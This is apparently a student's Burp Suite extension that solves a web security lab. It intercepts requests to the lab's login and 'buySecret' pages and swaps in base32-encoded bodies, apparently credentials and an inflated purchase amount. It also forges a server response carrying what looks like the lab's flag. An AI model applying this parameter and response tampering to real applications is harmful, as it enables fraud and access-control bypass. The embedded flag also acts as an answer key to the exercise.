package burp;

import java.io.PrintWriter;
import java.util.List;

public class BurpExtender implements IBurpExtender, IHttpListener
{
    private PrintWriter stdout;
    private IExtensionHelpers helpers;

    //
    // implement IBurpExtender and IHttpListener
    //

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("19300240012");
        // print logs here
        stdout = new PrintWriter(callbacks.getStdout(), true);
        // register ourselves as an HTTP listener
        callbacks.registerHttpListener(this);
    }

    //
    // implement IHttpListener
    //

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
    {
        // process request
        if (messageIsRequest)
        {
            /*stdout.println("Request");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort() );
            // print out the request
            String req = new String(messageInfo.getRequest() );
            stdout.println("request " + req);*/

            // you can modify the request like this
//            输出原有数据
            stdout.println(new String(messageInfo.getRequest() ) );

            IRequestInfo analyzedRequest = helpers.analyzeRequest(messageInfo.getRequest());
            List<String> header = analyzedRequest.getHeaders();

            if(header.get(0).equals("POST /lab7/login.php HTTP/1.1")){
                byte[] text = "msg=OVZWK4TOMFWWKPKHKVCVGVBGOBQXG43XN5ZGIPKUIVGVAX2QIFJVGV2E".getBytes();
                //输出修改数据
                stdout.println(new String(helpers.buildHttpMessage(header, text)));
                messageInfo.setRequest(helpers.buildHttpMessage(header, text));

            }
            else if(header.get(0).equals("POST /lab7/buySecret.php HTTP/1.1")){
                byte[] text = "msg=OVZWK4S7NFSD2MJZGMYDAMRUGAYDCMRGNVXW4ZLZHUYTAMBQGAYDAMBQGAYDAJTJONPWMYLLMU6TA".getBytes();
                //输出修改数据
                stdout.println(new String(helpers.buildHttpMessage(header, text)));
                messageInfo.setRequest(helpers.buildHttpMessage(header, text));
            }
            else{
                messageInfo.setRequest(messageInfo.getRequest() );
            }



        }


        // process response
        if (!messageIsRequest)
        {
            /*stdout.println("Response");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort() );
            // print out the response
            String resp = new String(messageInfo.getResponse() );
            stdout.println("response " + resp);*/
            // you can modify the request like this

            stdout.println(new String(messageInfo.getResponse() ) );

            IResponseInfo analyzedResponse = helpers.analyzeResponse(messageInfo.getResponse());
            List<String> header = analyzedResponse.getHeaders();
            stdout.println(analyzedResponse.getHeaders());

            if(header.get(6).equals("Content-Length: 160")){
                byte[] text = "PMRHEZLTOVWHIIR2GEWCE3LFONZWCZ3FEI5CE43VMNRWK43TEIWCE2LEEI5CEMJZGMYDAMRUGAYDCMRCFQRFGZLDOJSXIMJCHIRGM3DBM55WKNBTPFPXANDDNMZTOX3TNYYWMZRRJZTX2IRMEJWW63TFPERDUMJQGAYDAMBQGAYDA7I".getBytes();
                //输出修改数据
                stdout.println(new String(helpers.buildHttpMessage(header, text)));
                messageInfo.setResponse(helpers.buildHttpMessage(header, text));

            }
            else {
                messageInfo.setResponse(messageInfo.getResponse());
            }
        }
    }

}